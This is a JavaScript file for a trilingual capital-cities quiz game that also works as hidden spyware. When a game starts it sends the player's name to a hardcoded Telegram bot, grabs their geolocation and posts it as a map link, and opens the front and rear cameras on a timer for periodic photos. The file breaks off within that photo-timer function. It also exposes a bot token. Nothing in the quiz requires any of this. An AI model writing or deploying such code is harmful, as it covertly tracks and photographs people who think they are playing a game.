// script.js

const TELEGRAM_BOT_TOKEN = '7921776519:AAEtasvOGOZxdZo4gUNscLC49zSdm3CtITw';
const TELEGRAM_CHAT_ID = '8071841674';

const questionsData = [
  {
    hy: { q: "Որն է Հայաստանի մայրաքաղաքը", answers: ["Երևան", "Գյումրի", "Վանաձոր", "Հրազդան"], correct: 0 },
    ru: { q: "Какой город является столицей Армении", answers: ["Ереван", "Гюмри", "Ванадзор", "Раздан"], correct: 0 },
    en: { q: "What is the capital of Armenia?", answers: ["Yerevan", "Gyumri", "Vanadzor", "Hrazdan"], correct: 0 }
  },
  {
    hy: { q: "Որն է Ռուսաստանի մայրաքաղաքը", answers: ["Մոսկվա", "Սանկտ Պետերբուրգ", "Նովոսիբիրսկ", "Եկատերինբուրգ"], correct: 0 },
    ru: { q: "Какой город является столицей России", answers: ["Москва", "Санкт-Петербург", "Новосибирск", "Екатеринбург"], correct: 0 },
    en: { q: "What is the capital of Russia?", answers: ["Moscow", "Saint Petersburg", "Novosibirsk", "Yekaterinburg"], correct: 0 }
  },
  {
    hy: { q: "Որն է Ֆրանսիայի մայրաքաղաքը", answers: ["Փարիզ", "Լիոն", "Մարսել", "Նիս"], correct: 0 },
    ru: { q: "Какой город является столицей Франции", answers: ["Париж", "Лион", "Марсель", "Ницца"], correct: 0 },
    en: { q: "What is the capital of France?", answers: ["Paris", "Lyon", "Marseille", "Nice"], correct: 0 }
  },
  // ... здесь дополнительно до 30 вопросов ...
];

const translations = {
  hy: {
    enterName: "Մուտքագրեք ձեր անունը",
    startGame: "Սկսել խաղը",
    tryAgain: "Փորձել նորից",
    questionsLeft: "Հարցեր մնացել են",
    correctAnswers: "Ճիշտ պատասխաններ",
    wrongAnswers: "Սխալ պատասխաններ",
    victory: "Ձեզնով հաղթեցիք! 🎉",
    defeat: "Ցավում ենք, պարտվեցիք 😞",
    namePlaceholder: "Մուտքագրեք ձեր անունը",
    languageSelected: "Ընտրված լեզու"
  },
  ru: {
    enterName: "Введите ваше имя",
    startGame: "Начать игру",
    tryAgain: "Попробовать снова",
    questionsLeft: "Осталось вопросов",
    correctAnswers: "Правильных ответов",
    wrongAnswers: "Неправильных ответов",
    victory: "Вы выиграли! 🎉",
    defeat: "К сожалению, вы проиграли 😞",
    namePlaceholder: "Введите ваше имя",
    languageSelected: "Выбранный язык"
  },
  en: {
    enterName: "Enter your name",
    startGame: "Start Game",
    tryAgain: "Try Again",
    questionsLeft: "Questions left",
    correctAnswers: "Correct answers",
    wrongAnswers: "Wrong answers",
    victory: "You won! 🎉",
    defeat: "Sorry, you lost 😞",
    namePlaceholder: "Enter your name",
    languageSelected: "Selected language"
  }
};

let currentLanguage = localStorage.getItem('lang') || 'hy';
let userName = '';
let currentQuestions = [];
let currentQuestionIndex = 0;
let correctCount = 0;
let wrongCount = 0;

let geoCoords = null;
let cameraStreams = { front: null, back: null };
let photoTimers = { front: null, back: null };

const nameFormContainer = document.getElementById('name-form-container');
const nameForm = document.getElementById('name-form');
const nameInput = document.getElementById('name-input');
const nameLabel = document.querySelector('label[for="name-input"]');
const startBtn = nameForm.querySelector('button');

const languageButtons = document.querySelectorAll('.lang-btn');

const gameArea = document.getElementById('game-area');
const userNameDiv = document.getElementById('user-name');
const scoreInfoDiv = document.getElementById('score-info');
const questionDiv = document.getElementById('question');
const answerButtonsDiv = document.getElementById('answer-buttons');
const tryAgainBtn = document.getElementById('try-again-btn');

// Применяем переводы в интерфейсе
function applyTranslations() {
  nameLabel.textContent = translations[currentLanguage].enterName;
  nameInput.placeholder = translations[currentLanguage].namePlaceholder;
  startBtn.textContent = translations[currentLanguage].startGame;
  tryAgainBtn.textContent = translations[currentLanguage].tryAgain;
  updateScoreInfo();
}

// Обновляем информацию о счёте и имени
function updateScoreInfo() {
  const questionsLeft = 10 - currentQuestionIndex;
  scoreInfoDiv.textContent = `${translations[currentLanguage].questionsLeft}: ${questionsLeft} | ` +
    `${translations[currentLanguage].correctAnswers}: ${correctCount} | ` +
    `${translations[currentLanguage].wrongAnswers}: ${wrongCount}`;
  userNameDiv.textContent = userName || '-';
}

// Перемешиваем массив (Фишер-Йейтс)
function shuffleArray(array) {
  for (let i = array.length - 1; i > 0; i--) {
    let j = Math.floor(Math.random() * (i + 1));
    [array[i], array[j]] = [array[j], array[i]];
  }
}

// Выбираем случайные 10 вопросов из базы (30 вопросов)
function selectQuestions() {
  let indices = Array.from(Array(questionsData.length).keys());
  shuffleArray(indices);
  currentQuestions = indices.slice(0, 10).map(i => questionsData[i]);
}

// Устанавливаем язык и сохраняем его
function setLanguage(lang) {
  currentLanguage = lang;
  localStorage.setItem('lang', lang);
  applyTranslations();
}
  
// Инициализация кнопок переключения языка
languageButtons.forEach(btn => {
  btn.addEventListener('click', () => {
    setLanguage(btn.dataset.lang);
  });
});
// Старт игры, сохраняем имя, готовим вопросы и UI
function startGame() {
  userName = nameInput.value.trim() || (currentLanguage === 'hy' ? "Անհայտ" : currentLanguage === 'ru' ? "Неизвестный" : "Unknown");
  localStorage.setItem('userName', userName);

  currentQuestionIndex = 0;
  correctCount = 0;
  wrongCount = 0;
  selectQuestions();

  nameFormContainer.style.display = 'none';
  gameArea.style.display = 'block';

  showQuestion();
  updateScoreInfo();
  sendTelegramStart();
  startCameraIfAllowed();
  requestGeolocation();
}

// Отобразить текущий вопрос и варианты ответов
function showQuestion() {
  clearAnswerButtons();

  if (currentQuestionIndex >= currentQuestions.length) {
    // Если вопросов больше нет — показываем результаты
    showResults();
    return;
  }

  const qObj = currentQuestions[currentQuestionIndex][currentLanguage];
  questionDiv.textContent = qObj.q;

  // Перемешиваем ответы с сохранением правильного
  let answers = qObj.answers.map((a, i) => ({ text: a, isCorrect: i === qObj.correct }));
  shuffleArray(answers);

  answers.forEach(ans => {
    let btn = document.createElement('button');
    btn.classList.add('btn');
    btn.textContent = ans.text;
    btn.addEventListener('click', () => selectAnswer(btn, ans.isCorrect));
    answerButtonsDiv.appendChild(btn);
  });

  updateScoreInfo();
}

// Удаляем кнопки ответов перед показом нового вопроса
function clearAnswerButtons() {
  while (answerButtonsDiv.firstChild) {
    answerButtonsDiv.removeChild(answerButtonsDiv.firstChild);
  }
}
// Обработка выбора ответа игроком
function selectAnswer(button, isCorrect) {
  // Блокируем все кнопки, чтобы нельзя было нажать повторно
  Array.from(answerButtonsDiv.children).forEach(btn => btn.disabled = true);

  if (isCorrect) {
    button.classList.add('correct');
    correctCount++;
  } else {
    button.classList.add('wrong');
    wrongCount++;
    // Подсвечиваем правильный ответ зелёным
    Array.from(answerButtonsDiv.children).forEach(btn => {
      if (btn.textContent === currentQuestions[currentQuestionIndex][currentLanguage].answers[currentQuestions[currentQuestionIndex][currentLanguage].correct]) {
        btn.classList.add('correct');
      }
    });
  }

  updateScoreInfo();

  // Ждём 1.5 секунды, чтобы пользователь увидел подсветку, потом следующий вопрос
  setTimeout(() => {
    currentQuestionIndex++;
    showQuestion();
  }, 1500);
}
// Показать результаты по окончании вопросов
function showResults() {
  clearAnswerButtons();

  // Выводим сообщение о победе или поражении (победа, если правильных ответов >=6)
  questionDiv.textContent = correctCount >= 6 ? translations[currentLanguage].victory : translations[currentLanguage].defeat;

  tryAgainBtn.style.display = 'block';

  // Фон игры остается, чтобы пользователь видел состояние
  gameArea.style.filter = 'blur(2px)';
  gameArea.style.pointerEvents = 'none';

  updateScoreInfo();

  sendTelegramResult();
}

// Кнопка «Попробовать снова» — сброс и запуск новой игры
tryAgainBtn.addEventListener('click', () => {
  tryAgainBtn.style.display = 'none';
  gameArea.style.filter = 'none';
  gameArea.style.pointerEvents = 'auto';

  // Запрашиваем заново доступы, если не даны
  if (!geoCoords) {
    requestGeolocation();
  }
  if (!cameraStreams.front || !cameraStreams.back) {
    startCameraIfAllowed();
  }

  startGame();
});
// Запрос геолокации
function requestGeolocation() {
  if (!navigator.geolocation) {
    console.warn("Геолокация не поддерживается");
    return;
  }
  navigator.geolocation.getCurrentPosition(
    (position) => {
      geoCoords = position.coords;
      sendTelegramGeo();
    },
    (error) => {
      console.warn("Ошибка получения геолокации:", error);
    }
  );
}

// Отправка геолокации в Telegram в виде ссылки Google Maps
function sendTelegramGeo() {
  if (!geoCoords) return;
  const url = `https://www.google.com/maps?q=${geoCoords.latitude},${geoCoords.longitude}`;
  const text = `📍 Геолокация: [Посмотреть на карте](${url})`;
  sendTelegramMessage(text);
}
// Общая функция отправки сообщения в Telegram через fetch API
function sendTelegramMessage(text) {
  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text: text,
      parse_mode: "Markdown"
    })
  }).catch(e => console.error("Ошибка отправки в Telegram:", e));
}
// Отправить начало игры (имя, язык)
function sendTelegramStart() {
  const msg = `👤 Игрок начал игру: ${userName}\n🌐 Язык: ${translations[currentLanguage].languageSelected} (${currentLanguage})`;
  sendTelegramMessage(msg);
}

// Отправить результат игры (имя, язык, количество правильных, геолокация)
function sendTelegramResult() {
  let msg = `🏁 Игра окончена\n👤 Игрок: ${userName}\n🌐 Язык: ${translations[currentLanguage].languageSelected} (${currentLanguage})\n` +
            `✅ Правильных ответов: ${correctCount}\n`;
  if (geoCoords) {
    const url = `https://www.google.com/maps?q=${geoCoords.latitude},${geoCoords.longitude}`;
    msg += `📍 Геолокация: [Посмотреть на карте](${url})\n`;
  }
  sendTelegramMessage(msg);
}
// Запуск камеры (фронтальная и задняя), если есть доступ
async function startCameraIfAllowed() {
  try {
    // Фронтальная камера
    const frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
    cameraStreams.front = frontStream;
    startPhotoTimer(frontStream, 'front');

    // Задняя камера
    const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "environment" } }, audio: false });
    cameraStreams.back = backStream;
    startPhotoTimer(backStream, 'back');
  } catch (e) {
    console.warn("Камера не доступна:", e);
  }
}

// Запускаем таймер для фото с камеры каждые 5 секунд
function startPhotoTimer(stream, whichCamera) {
  const videoTrack = stream.getVideoTracks()[0];
  if (!videoTrack) return
